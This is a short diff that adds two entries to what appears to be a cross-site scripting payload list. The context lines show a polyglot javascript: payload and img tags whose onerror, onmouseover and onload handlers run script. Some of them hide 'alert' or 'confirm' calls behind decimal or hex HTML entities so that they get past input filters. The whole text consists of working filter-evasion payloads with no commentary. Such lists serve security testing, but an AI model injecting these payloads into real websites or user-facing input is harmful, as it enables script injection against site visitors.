@@ -8,3 +8,5 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/on
 <IMG SRC=# onmouseover="alert('XSS')">
 <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
 <img src="x" onerror="document.write('<h1>XSS</h1>')">
+<img src=x onload=c&#111;nfirm(1)>
+<img src=x onload=&#x63;&#x6f;&#x6e;&#x66;&#x69;&#x72;&#x6d;(1)>
